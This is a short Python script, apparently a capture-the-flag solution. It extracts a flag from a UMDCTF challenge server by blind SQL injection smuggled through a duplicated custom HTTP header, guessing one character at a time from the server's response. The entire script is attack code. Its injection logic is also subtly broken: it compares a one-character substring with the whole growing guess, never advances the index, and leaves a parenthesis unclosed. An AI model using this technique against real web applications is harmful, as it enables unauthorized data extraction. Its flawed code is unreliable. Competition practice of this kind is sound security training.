import socket
import ssl

host = "steve-le-poisson-api.challs.umdctf.io"
port = 443

context = ssl.create_default_context()

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"
found = ""
index = len(found) + 1

while True:
    found_new_char = False

    for c in charset:
        guess = found + c
        print(f"[*] Trying: {guess}")

        injection = f"' OR (SELECT substr(value,{index},1)='{guess}'"

        payload = (
            "GET /deviner HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Connection: close\r\n"
            f"x-steve-supposition: {injection}\r\n"
            "x-steve-supposition: dummy\r\n"
            "\r\n"
        )

        with socket.create_connection((host, port)) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                ssock.sendall(payload.encode())
                response = b""
                while True:
                    data = ssock.recv(4096)
                    if not data:
                        break
                    response += data

        body = response.decode(errors='ignore')

        if "Tu as raison" in body:
            print(f"[+] Found: {guess}")
            found += c
            found_new_char = True
            break

    if not found_new_char:
        print(f"[*] Finished! Flag: {found}")
        break
